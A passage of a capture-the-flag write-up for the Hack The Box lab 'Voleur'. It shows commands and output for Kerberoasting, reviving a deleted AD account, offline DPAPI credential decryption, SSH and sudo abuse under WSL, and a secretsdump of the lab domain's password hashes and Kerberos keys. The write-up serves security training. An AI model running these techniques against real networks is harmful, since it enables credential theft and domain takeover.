+</span></span><span class="line"><span class="cl">--------------------  ---------  ------------------------------------------------------  --------------------------  --------------------------  ----------
+</span></span><span class="line"><span class="cl">fake/dc.voleur.htb    svc_winrm  <span class="nv">CN</span><span class="o">=</span>Remote Management Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>voleur,DC<span class="o">=</span>htb  2025-01-31 10:10:12.398769  2025-01-29 16:07:32.711487
+</span></span></code></pre></div><p>The hash cracked: <code>svc_winrm:AFireInsidedeOzarctica980219afi</code>.</p>
+<p>TGT for svc_winrm and into WinRM:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ✗ faketime -f <span class="s1">&#39;+8h&#39;</span> getTGT.py voleur.htb/svc_winrm:<span class="s1">&#39;AFireInsidedeOzarctica980219afi&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in svc_winrm.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/labs/voleur ❯ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/svc_winrm.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/labs/voleur ❯ faketime -f <span class="s1">&#39;+8h&#39;</span> evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
+</span></span></code></pre></div><p><em>evil-winrm needs the <code>-r</code> realm flag and the KRB5CCNAME environment variable set for Kerberos auth to work. The realm file has to be correctly configured too.</em></p>
+<h2 id="dead-end-genericwrite-on-lacey">Dead End: GenericWrite on Lacey</h2>
+<p>Inside the WinRM session, <code>dir C:\Users</code> showed the expected accounts plus one surprising one: <code>todd.wolfe</code> had a home directory even though the spreadsheet said his account was deleted.</p>
+<pre tabindex="0"><code>*Evil-WinRM* PS C:\Users\svc_winrm\Desktop&gt; dir C:\Users
+
+    Directory: C:\Users
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          6/5/2025   3:30 PM                Administrator
+d-----         1/29/2025   7:11 AM                jeremy.combs
+d-r---         1/28/2025  12:35 PM                Public
+d-----         1/30/2025   3:39 AM                svc_backup
+d-----         1/29/2025   4:47 AM                svc_ldap
+d-----         1/29/2025   7:07 AM                svc_winrm
+d-----         1/29/2025   4:53 AM                todd.wolfe
+</code></pre><p>My first theory: use svc_ldap&rsquo;s GenericWrite over <code>lacey.miller</code> to kerberoast her too, then pivot toward Jeremy. Tried it:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ✗ faketime -f <span class="s2">&#34;+8h&#34;</span> bloodyAD -k -d <span class="nv">$DOMAIN</span> --host dc.<span class="nv">$DOMAIN</span> <span class="nb">set</span> object lacey.miller servicePrincipalName -v <span class="s2">&#34;lacey/spn.</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> lacey.miller<span class="s1">&#39;s servicePrincipalName has been updated
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">…/labs/voleur ❯ faketime -f &#39;</span>+8h<span class="err">&#39;</span> GetUserSPNs.py -k -no-pass -dc-host dc.voleur.htb voleur.htb/svc_ldap -request-user lacey.miller
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ServicePrincipalName  Name          MemberOf                                     PasswordLastSet             LastLogon  Delegation 
+</span></span><span class="line"><span class="cl">--------------------  ------------  -------------------------------------------  --------------------------  ---------  ----------
+</span></span><span class="line"><span class="cl">lacey/spn.voleur.htb  lacey.miller  <span class="nv">CN</span><span class="o">=</span>Second-Line Technicians,DC<span class="o">=</span>voleur,DC<span class="o">=</span>htb  2025-01-29 10:20:10.758901  &lt;never&gt;
+</span></span></code></pre></div><pre tabindex="0"><code>Session..........: hashcat                                
+Status...........: Exhausted
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lac...d5f118
+</code></pre><p>Exhausted. Lacey&rsquo;s password wasn&rsquo;t in rockyou. There&rsquo;s no ADCS on this box either, so shadow credentials are off the table. Dead end.</p>
+<p>The group name &ldquo;Restore_Users&rdquo; plus Todd&rsquo;s flagged-as-deleted account in the spreadsheet - that was the real path.</p>
+<h2 id="reanimate-tombstone-bringing-todd-back">Reanimate-Tombstone: Bringing Todd Back</h2>
+<p>I covered tombstone reanimation in detail in the <a href="/writeups/htb-tombwatcher/">TombWatcher writeup</a> - same mechanic, different path to it. Short version: when an account is deleted in Active Directory it doesn&rsquo;t disappear immediately. AD moves it to <code>CN=Deleted Objects</code> and strips most of its attributes, but keeps the object&rsquo;s SID and <code>sAMAccountName</code> for a configurable period (the <code>msDS-deletedObjectLifetime</code>, default 180 days). This is called a tombstone. The Reanimate-Tombstones extended right, when granted on the domain root or a specific OU, lets a principal restore a tombstoned object back to its original location with its SID intact.</p>
+<p>The <code>Restore_Users</code> group has that right. <code>svc_ldap</code> is a member. Let me query deleted objects using the LDAP control OID <code>1.2.840.113556.1.4.2064</code> (the &ldquo;show deleted objects&rdquo; control):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ✗ faketime -f <span class="s1">&#39;+8h&#39;</span> bloodyAD -d voleur.htb -k --host dc.voleur.htb get search -c 1.2.840.113556.1.4.2064 <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --filter <span class="s1">&#39;(isDeleted=TRUE)&#39;</span> --attr name
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">CN</span><span class="o">=</span>Deleted Objects,DC<span class="o">=</span>voleur,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">name: Deleted Objects
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">CN</span><span class="o">=</span>Todd Wolfe<span class="se">\0</span>ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>voleur,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">name: Todd Wolfe
+</span></span><span class="line"><span class="cl">DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
+</span></span></code></pre></div><p>Todd is there. Get his SID - restoration by SID is more reliable than by name when multiple tombstones exist:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ✗ faketime -f <span class="s1">&#39;+8h&#39;</span> bloodyAD -d voleur.htb -k --host dc.voleur.htb get search -c 1.2.840.113556.1.4.2064 <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --filter <span class="s1">&#39;(sAMAccountName=todd.wolfe)&#39;</span> --attr sAMAccountName,distinguishedName,objectSid
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">CN</span><span class="o">=</span>Todd Wolfe<span class="se">\0</span>ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>voleur,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">objectSid: S-1-5-21-3927696377-1337352550-2781715495-1110
+</span></span><span class="line"><span class="cl">sAMAccountName: todd.wolfe
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ❯ faketime -f <span class="s1">&#39;+8h&#39;</span> bloodyAD -d voleur.htb -k --host dc.voleur.htb <span class="nb">set</span> restore <span class="s1">&#39;S-1-5-21-3927696377-1337352550-2781715495-1110&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> S-1-5-21-3927696377-1337352550-2781715495-1110 has been restored successfully under <span class="nv">CN</span><span class="o">=</span>Todd Wolfe,OU<span class="o">=</span>Second-Line Support Technicians,DC<span class="o">=</span>voleur,DC<span class="o">=</span>htb
+</span></span></code></pre></div><p>Todd is back, restored to his original OU with his original SID. The spreadsheet already gave us his password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ❯ kinit todd.wolfe
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> todd.wolfe@VOLEUR.HTB: 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/labs/voleur ❯ klist
+</span></span><span class="line"><span class="cl">Ticket cache: FILE:/home/kanyo/work/htb/labs/voleur/svc_ldap.ccache
+</span></span><span class="line"><span class="cl">Default principal: todd.wolfe@VOLEUR.HTB
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Valid starting       Expires              Service principal
+</span></span><span class="line"><span class="cl">06/07/2026 17:30:18  06/08/2026 03:30:18  krbtgt/VOLEUR.HTB@VOLEUR.HTB
+</span></span><span class="line"><span class="cl">	renew <span class="k">until</span> 06/14/2026 17:30:17
+</span></span></code></pre></div><h2 id="dpapi-todds-archived-credentials">DPAPI: Todd&rsquo;s Archived Credentials</h2>
+<p>Todd had access to a subfolder in the IT share that wasn&rsquo;t visible as ryan or svc_ldap. Inside it were two directories that are immediately recognizable if you&rsquo;ve done any DPAPI work before:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># cd Credentials</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Wed Jan <span class="m">29</span> 16:13:09 <span class="m">2025</span> .
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Wed Jan <span class="m">29</span> 16:13:09 <span class="m">2025</span> ..
+</span></span><span class="line"><span class="cl">-rw-rw-rw-        <span class="m">398</span>  Wed Jan <span class="m">29</span> 14:13:50 <span class="m">2025</span> 772275FAD58525253490A9B0039791D3
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># cd S-1-5-21-3927696377-1337352550-2781715495-1110</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Wed Jan <span class="m">29</span> 16:13:09 <span class="m">2025</span> .
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Wed Jan <span class="m">29</span> 16:13:09 <span class="m">2025</span> ..
+</span></span><span class="line"><span class="cl">-rw-rw-rw-        <span class="m">740</span>  Wed Jan <span class="m">29</span> 14:09:25 <span class="m">2025</span> 08949382-134f-4c63-b93c-ce52efc0aa88
+</span></span><span class="line"><span class="cl">-rw-rw-rw-        <span class="m">900</span>  Wed Jan <span class="m">29</span> 13:53:08 <span class="m">2025</span> BK-VOLEUR
+</span></span><span class="line"><span class="cl">-rw-rw-rw-         <span class="m">24</span>  Wed Jan <span class="m">29</span> 13:53:08 <span class="m">2025</span> Preferred
+</span></span></code></pre></div><p>These are standard Windows DPAPI artifacts. When a user saves credentials through Windows Credential Manager - logging into a network share, saving a password for an RDP connection, anything like that - Windows encrypts the credential blob using the user&rsquo;s DPAPI master key. The master key itself is derived from the user&rsquo;s password (via their NT hash) and their SID. The encrypted blobs live at <code>AppData\Roaming\Microsoft\Credentials\</code> and the master keys at <code>AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\</code>.</p>
+<p>When Todd was tombstoned, his Windows profile was archived to the IT share rather than wiped. That was the mistake - the archive included his entire DPAPI state: the credential blob containing Jeremy&rsquo;s saved password, and the master key needed to decrypt it.</p>
+<p>Decrypt the master key offline using Todd&rsquo;s password:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ❯ faketime -f <span class="s1">&#39;+8h&#39;</span> dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password <span class="s1">&#39;NightT1meP1dg3on14&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>MASTERKEYFILE<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Version     :        <span class="m">2</span> <span class="o">(</span>2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
+</span></span><span class="line"><span class="cl">Flags       :        <span class="m">0</span> <span class="o">(</span>0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Policy      :        <span class="m">0</span> <span class="o">(</span>0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">MasterKeyLen: <span class="m">00000088</span> <span class="o">(</span>136<span class="o">)</span>
+</span></span><span class="line"><span class="cl">BackupKeyLen: <span class="m">00000068</span> <span class="o">(</span>104<span class="o">)</span>
+</span></span><span class="line"><span class="cl">CredHistLen : <span class="m">00000000</span> <span class="o">(</span>0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">DomainKeyLen: <span class="m">00000174</span> <span class="o">(</span>372<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Decrypted key with User Key <span class="o">(</span>MD4 protected<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+</span></span></code></pre></div><p>Use the master key to decrypt the credential blob:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ❯ faketime -f <span class="s1">&#39;+8h&#39;</span> dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>CREDENTIAL<span class="o">]</span>
+</span></span><span class="line"><span class="cl">LastWritten : 2025-01-29 12:55:19+00:00
+</span></span><span class="line"><span class="cl">Flags       : 0x00000030 <span class="o">(</span>CRED_FLAGS_REQUIRE_CONFIRMATION<span class="p">|</span>CRED_FLAGS_WILDCARD_MATCH<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Persist     : 0x00000003 <span class="o">(</span>CRED_PERSIST_ENTERPRISE<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Type        : 0x00000002 <span class="o">(</span>CRED_TYPE_DOMAIN_PASSWORD<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Target      : Domain:target<span class="o">=</span>Jezzas_Account
+</span></span><span class="line"><span class="cl">Description : 
+</span></span><span class="line"><span class="cl">Unknown     : 
+</span></span><span class="line"><span class="cl">Username    : jeremy.combs
+</span></span><span class="line"><span class="cl">Unknown     : qT3V9pLXyN7W4m
+</span></span></code></pre></div><p><code>jeremy.combs:qT3V9pLXyN7W4m</code>. Todd had saved Jeremy&rsquo;s credentials in Credential Manager at some point - maybe to access a shared resource, maybe to test a service. Windows encrypted them silently. When Todd got deleted and his profile archived, those credentials came along for the ride.</p>
+<h2 id="jeremy-the-ssh-key-and-the-backup">Jeremy, the SSH Key, and the Backup</h2>
+<p>The spreadsheet noted Jeremy had access to the Software folder. Kinit as Jeremy and look at the IT share:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ❯ kinit jeremy.combs
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> jeremy.combs@VOLEUR.HTB: 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/labs/voleur ❯ klist -l
+</span></span><span class="line"><span class="cl">Principal name                 Cache name
+</span></span><span class="line"><span class="cl">--------------                 ----------
+</span></span><span class="line"><span class="cl">jeremy.combs@VOLEUR.HTB        FILE:/tmp/krb5cc_1000
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/labs/voleur ❯ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>/tmp/krb5cc_1000
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/labs/voleur ❯ faketime -f <span class="s1">&#39;+8h&#39;</span> smbclient.py -k -no-pass dc.voleur.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># use IT</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Wed Jan <span class="m">29</span> 10:10:01 <span class="m">2025</span> .
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Thu Jul <span class="m">24</span> 21:09:59 <span class="m">2025</span> ..
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Thu Jan <span class="m">30</span> 17:11:29 <span class="m">2025</span> Third-Line Support
+</span></span><span class="line"><span class="cl"><span class="c1"># cd Third-Line Support</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Thu Jan <span class="m">30</span> 17:11:29 <span class="m">2025</span> .
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Wed Jan <span class="m">29</span> 10:10:01 <span class="m">2025</span> ..
+</span></span><span class="line"><span class="cl">-rw-rw-rw-       <span class="m">2602</span>  Thu Jan <span class="m">30</span> 17:11:29 <span class="m">2025</span> id_rsa
+</span></span><span class="line"><span class="cl">-rw-rw-rw-        <span class="m">186</span>  Thu Jan <span class="m">30</span> 17:07:35 <span class="m">2025</span> Note.txt.txt
+</span></span></code></pre></div><p>An RSA private key and a note. The note:</p>
+<pre tabindex="0"><code>Jeremy,
+
+I&#39;ve had enough of Windows Backup! I&#39;ve part configured WSL to see if we can utilize any of the backup tools from Linux.
+
+Please see what you can set up.
+
+Thanks,
+
+Admin
+</code></pre><p>Port 2222 from the nmap. <code>svc_backup</code> with that SSH key. The note explains what the Linux SSH is for - WSL is configured on the DC to run Linux binaries against the Windows filesystem.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">svc_backup@DC:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> svc_backup on DC:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User svc_backup may run the following commands on DC:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: ALL
+</span></span></code></pre></div><p>Full sudo, no password. Confirmed WSL interop is active:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@DC:/home/svc_backup# cat /proc/sys/fs/binfmt_misc/WSLInterop 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">enabled
+</span></span><span class="line"><span class="cl">interpreter /init
+</span></span><span class="line"><span class="cl">flags: 
+</span></span><span class="line"><span class="cl">offset <span class="m">0</span>
+</span></span><span class="line"><span class="cl">magic 4d5a
+</span></span></code></pre></div><p>The WSL interop entry means Windows PE binaries (identified by the <code>MZ</code> magic) are handed off to the Windows kernel for execution. The Windows filesystem is mounted under <code>/mnt/c/</code>. Browsing the IT share from inside WSL:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">svc_backup@DC:/mnt/c/IT/Third-Line Support$ ls
+</span></span><span class="line"><span class="cl">Backups  Note.txt.txt  id_rsa
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls 
+</span></span><span class="line"><span class="cl">Active Directory/  registry/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls Active<span class="se">\ </span>Directory/
+</span></span><span class="line"><span class="cl">ntds.dit  ntds.jfm
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls registry/
+</span></span><span class="line"><span class="cl">SECURITY  SYSTEM
+</span></span></code></pre></div><p>A pre-staged backup: <code>ntds.dit</code>, <code>SYSTEM</code>, <code>SECURITY</code>. Everything needed to extract every credential in the domain. Pulled them locally and ran <code>secretsdump</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/voleur/Backups ❯ secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Searching <span class="k">for</span> pekList, be patient
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> PEK <span class="c1"># 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Reading and decrypting hashes from ntds.dit 
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
+</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
+</span></span><span class="line"><span class="cl">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\r</span>yan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\m</span>arie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\l</span>acey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\j</span>eremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Kerberos keys from ntds.dit 
+</span></span><span class="line"><span class="cl">Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
+</span></span><span class="line"><span class="cl">Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
+</span></span><span class="line"><span class="cl">Administrator:des-cbc-md5:459d836b9edcd6b0
+</span></span><span class="line"><span class="cl">DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
+</span></span><span class="line"><span class="cl">DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
+</span></span><span class="line"><span class="cl">DC$:des-cbc-md5:64e05b6d1abff1c8
+</span></span><span class="line"><span class="cl">krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
+</span></span><span class="line"><span class="cl">krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
+</span></span><span class="line"><span class="cl">krbtgt:des-cbc-md5:34ae31d073f86d20
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\r</span>yan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\r</span>yan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\r</span>yan.naylor:des-cbc-md5:4376f7917a197a5b
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\m</span>arie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\m</span>arie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\m</span>arie.bryant:des-cbc-md5:cdf1492604d3a220
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\l</span>acey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\l</span>acey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\l</span>acey.miller:des-cbc-md5:6eef922076ba7675
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_ldap:des-cbc-md5:1ab0fbfeeaef5776
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_backup:des-cbc-md5:7ab513f8ab7f765e
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_iis:des-cbc-md5:70ce25431c577f92
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\j</span>eremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\j</span>eremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\j</span>eremy.combs:des-cbc-md5:192f702abff75257
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
